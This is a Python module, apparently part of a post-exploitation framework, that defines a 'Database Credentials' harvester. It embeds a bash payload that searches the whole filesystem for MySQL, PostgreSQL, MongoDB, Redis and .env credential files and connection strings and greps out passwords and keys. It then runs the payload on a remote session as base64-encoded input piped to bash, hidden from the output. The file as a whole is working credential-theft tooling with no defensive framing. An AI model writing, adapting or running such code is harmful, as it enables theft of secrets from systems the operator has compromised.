"""Database credentials harvester."""

from ..base import OperatorScript, ScriptResult


class DatabaseCreds(OperatorScript):
    """Harvest database credentials from multiple sources."""
    
    name = "Database Credentials"
    description = "Extract MySQL, PostgreSQL, MongoDB, and Redis credentials"
    category = "harvest"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] DATABASE CREDENTIALS HARVESTER"
echo "=================================="
echo ""

echo "[+] MySQL credentials:"
find / -name "my.cnf" -o -name ".my.cnf" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -H "password\\|user" "$file" 2>/dev/null
done
echo ""

echo "[+] PostgreSQL credentials:"
find / -name "pg_hba.conf" -o -name ".pgpass" -o -name "postgresql.conf" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
    grep -v "^#" "$file" 2>/dev/null | grep -E "password|user|host"
done
echo ""

echo "[+] MongoDB credentials:"
find / -name "mongod.conf" -o -name ".mongorc.js" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -H "password\\|keyFile\\|username" "$file" 2>/dev/null
done
echo ""

echo "[+] Redis credentials:"
find / -name "redis.conf" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -H "requirepass\\|masterauth" "$file" 2>/dev/null
done
echo ""

echo "[+] Database connection strings in configs:"
grep -r "mongodb://\\|mysql://\\|postgresql://\\|jdbc:\\|Server=\\|Data Source=" /opt /var/www /home /etc 2>/dev/null | grep -v "Binary" | head -30
echo ""

echo "[+] SQLite databases:"
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null | head -20
echo ""

echo "[+] Environment files with DB credentials:"
find / -name ".env" -o -name ".env.local" 2>/dev/null | while read file; do
    echo "[!] $file"
    grep -H "DB_\\|DATABASE_\\|MYSQL_\\|POSTGRES_\\|MONGO_" "$file" 2>/dev/null
done
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Harvesting database credentials...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Database credentials harvest executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
